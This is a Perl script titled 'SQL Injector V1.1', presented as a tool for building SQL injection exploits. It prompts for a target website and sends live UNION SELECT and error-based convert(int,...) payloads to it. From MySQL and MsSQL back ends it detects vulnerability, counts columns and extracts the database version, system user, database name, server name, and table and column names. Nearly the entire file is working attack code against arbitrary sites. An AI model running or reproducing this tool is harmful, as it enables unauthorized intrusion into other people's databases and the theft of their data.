#!/usr/bin/perl
# SQL Injector is a tool Made to help in building exploits for SQL injections Vulnerabilitis
# Coded By AlpHaNiX
# From NullArea.Net
# Greetz For All My Friends specialy Zigma
# Greetz For : Djekmani4Ever - Simo-Soft - Unary - Super-Crystal - Meister  - PowerX & Dear Slax
 
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

startcode :
system ("cls") ;
print "-----------------------------------------------\n" ;
print "[*]------------SQL INJECTOR V1.1------------[*]\n" ;
print "[*]-------------Coded By AlpHaNiX-----------[*]\n" ;
print "[*]-------------From NullArea.Net-----------[*]\n" ;
print "-----------------------------------------------\n" ;

print "\n\n[|]Menu:\n\n";
print "--MySQL--\n" ;
print "[1] MySQL Column Counter\n" ;
print "[2] MySQL Version\n\n";
print "--MsSQL--\n" ;
print "[3] MsSQL Details\n" ;
print "[4] MsSQL Tables & Columns\n\n" ;
print "[5] Exit\n\n\n" ;
print "Enter Your Choise Here : ";
my $chois=<STDIN>;

if ($chois==1){&My_SQL}
if ($chois==2){&My_SQL_Infos}
if ($chois==3){&Ms_SQL}
if ($chois==4){&Ms_SQL_Tables}
if ($chois==5){&EXIT}
if ($choise =! 1||2||3||4||5) {goto startcode ;}

##########################################################
# My SQL Column Counter
##########################################################
  sub My_SQL
{

print "\n/////////////////////////////////////////////////\n\n" ;
print "\n Please Enter Here Your Target Website :\n " ;
$target1=<STDIN> ;
my $site = $target1 ;
my $null = "09+and+1=" ;
my $code = "0+union+select+" ;
my $add = "+" ;
my $com = "--" ;
my $injection = $site.$null.$code."0",$com ;
#----------------------------------------
# Checking If Target Vulnerable or not !
#----------------------------------------
my $request   = HTTP::Request->new(GET=>$injection);
my $useragent = LWP::UserAgent->new();
$useragent->timeout(5);
my $response  = $useragent->request($request);
my $result   = $response->content;
  if( $response->content =~ /You have an error in your SQL syntax/ || $result=~ /mysql_fetch_/ || $result =~ /mysql_num_rows/ || $result =~ /The used SELECT statements have a different number of columns/)
    {
      print "\n\n\n[+] This Website Is Vulnerable\n" ;
	  print "[+] Working On It\n";
    }
      else
    {
	  system ("cls") ;
      print "[!] This WebSite Is Not SQL Vulnerable !\n\n";
      exit();
    }
#----------------------------------------
# Calculating Number Of Columns
#----------------------------------------
for ($i = 0 ; $i < 50 ; $i ++)
{
	$col.=','.$i;
	$specialword.=','."0x617a38387069783030713938";
    if ($i == 0)
      {
          $specialword = '' ;
          $col = '' ;
      }
    $sql=$site.$null.$code."0x617a38387069783030713938".$specialword.$com ;
    $response=get($sql)or die("[!] OpeRation Failed !\n") ;
	if($response =~ /az88pix00q98/)
      {
         $i ++;
         print "[+] This WebSite Have $i Columns\n" ;
         $sql=$site.$null.$code."0".$col.$com ;
         print "[+] The Injection Became like the Following\n\n" ;
		 print "  => ".$sql ."\n\n\n\n";	
         exit () ;		 
	  }	
}
}

##########################################################
# My SQL Details
##########################################################
  sub My_SQL_Infos
{
print "\n/////////////////////////////////////////////////\n\n" ;
print "\n Please Enter Here Your Target Website :\n " ;
$target1=<STDIN> ;
my $site = $target1 ;
my $null = "09+and+1=" ;
my $code = "0+union+select+" ;
my $add = "+" ;
my $com = "--" ;
my $injection = $site.$null.$code."0",$com ;
my $request   = HTTP::Request->new(GET=>$injection);
my $useragent = LWP::UserAgent->new();
$useragent->timeout(5);
my $response  = $useragent->request($request);
my $result   = $response->content;
  if( $response->content =~ /You have an error in your SQL syntax/ || $result=~ /mysql_fetch_/ || $result =~ /mysql_num_rows/ || $result =~ /The used SELECT statements have a different number of columns/)
    {
	print "\n\n[+] This Website Is Vulnerable\n" ;
	print "[+] Getting Infos , Pls wait ...." ;
    }
      else
    {
	  system ("cls") ;
      print "[!] This WebSite Is Not SQL Vulnerable !\n";
	  print "[+] Working On it ..... \n\n";	  
      exit();
    }
for ($i = 0 ; $i < 50 ; $i ++)
{
	$col.=','.$i;
	$specialword.=','."0x617a38387069783030713938";
    if ($i == 0)
      {
          $specialword = '' ;
          $col = '' ;
      }
    $sql=$site.$null.$code."0x617a38387069783030713938".$specialword.$com ;
    $response=get($sql)or die("[!] OpeRation Failed !\n") ;
	if($response =~ /az88pix00q98/)
      {
         $i ++;
         $sql=$site.$null.$code."0".$col.$com ;	 
         $sql=$site.$null.$code."0x617a38387069783030713938".$specialword."from"."+"."information_schema.tables".$com;
         $response=get($sql)or die("[!] operation failed ! try again\n");
         if($response =~ /az88pix00q98/)
         	{
         	print "\n[+] MySQL Version 5";
			print "\n[+] Information_schema is avabile !" ;
			exit() ;
            $sql=$site.$null.$code."0".$col.$com."from"."+"."information_schema.tables".$com;
         	}
         else
         	{
            	print "\n[+] MySQL Version 4";
				print "\n[+] Information_schema is not avabile !" ;
				exit () ;
         	}
	  }	
}

}

##########################################################
# MsSQL Details
##########################################################
sub Ms_SQL
{
print "\n/////////////////////////////////////////////////\n\n" ;
print "\n\n Please Specify A Website To Work On :\n" ;
print " " ;
$target = <STDIN> ;
print "\n[+] Working On $target" ;
$version = 'convert(int,(select+@@version));--' ;
$system_user = 'convert(int,(select+system_user));--';
$db_name = 'convert(int,(select+db_name()));--';
$servername = 'convert(int,(select+@@servername));--' ;
$site = $target ;

my $injection = $site.$version ;
my $request   = HTTP::Request->new(GET=>$injection);
my $useragent = LWP::UserAgent->new();
   $useragent->timeout(10);
my $response  = $useragent->request($request)->as_string ;
    if ($response =~ /.*?value\s'/)
	{
	print "[+] This Website Is SQL Vulnerable ..\n";
	print "[+] Working On It ..\n";
	
	$ver = $1 if ($response =~ /.*?value\s'(.*?)'\sto.*/sm) ;
	print "\n[!] MsSQL Version Is :";
	print "\n\n => $ver"	;
	
	     my $injection = $site.$system_user ;
         my $request   = HTTP::Request->new(GET=>$injection);
         my $useragent = LWP::UserAgent->new();
         $useragent->timeout(10);
         my $response  = $useragent->request($request)->as_string ;
	     $system_user = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
         print "\n[!] MsSQL System_User Is    :";
	     print "  $system_user  "	;
		  

                 my $injection = $site.$db_name ;
                 my $request   = HTTP::Request->new(GET=>$injection);
                 my $useragent = LWP::UserAgent->new();
                 $useragent->timeout(10);
                 my $response  = $useragent->request($request)->as_string ;
	             $db_name = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
                 print "\n[!] MsSQL Database Name Is  :";
	             print "  $db_name  "	;		  
	   
	                     my $injection = $site.$servername ;
                         my $request   = HTTP::Request->new(GET=>$injection);
                         my $useragent = LWP::UserAgent->new();
                         $useragent->timeout(10);
                         my $response  = $useragent->request($request)->as_string ;
	                     $servername = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
                         print "\n[!] MsSQL Server Name Is    :";
	                     print "  $servername  "	;	
                       
                                     exit ();					   

	
	
	}
	else 
	{
	system ("cls");
	print "\n[!] This Website Is Not SQL Vulnerable !";
	exit();
	}
}


##########################################################
# MsSQL Tables & Columns
##########################################################
sub Ms_SQL_Tables
{
print "\n/////////////////////////////////////////////////\n\n" ;
print "\n\n Please Specify A Website To Work On :\n" ;
print " " ;
$target = <STDIN> ;
print "\n[+] Working On $target" ;

$table = 'convert(int,(select+top+1+table_name+from+information_schema.tables));--';
$column = 'convert(int,(select+top+1+column_name+from+information_schema.columns));--' ;
$site = $target ;

my $injection = $site.$table ;
my $request   = HTTP::Request->new(GET=>$injection);
my $useragent = LWP::UserAgent->new();
   $useragent->timeout(10);
my $response  = $useragent->request($request)->as_string ;
    if ($response =~ /.*?value\s'/)
	{
	print "[+] This Website Is SQL Vulnerable ..\n";
	print "[+] Working On It ..\n";
	
	$tbl = $1 if ($response =~ /.*?value\s'(.*?)'\sto.*/sm) ;
	print "\n[!] MsSQL Tables Are  :";
	print "\n => $tbl  " ;
	
	     my $injection = $site.$column ;
         my $request   = HTTP::Request->new(GET=>$injection);
         my $useragent = LWP::UserAgent->new();
         $useragent->timeout(10);
         my $response  = $useragent->request($request)->as_string ;
	     $clm = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
         print "\n\n\n[!] MsSQL Columns Are :";
	     print "\n => $clm \n\n " ;
		 exit();
		  

	}
	else
	{ 
	print "\n[!] This Website Is Not SQL Vulnerable !";
	}
}


##########################################################
# EXIT
##########################################################
sub EXIT
{
system("cls") ;
exit ();
}




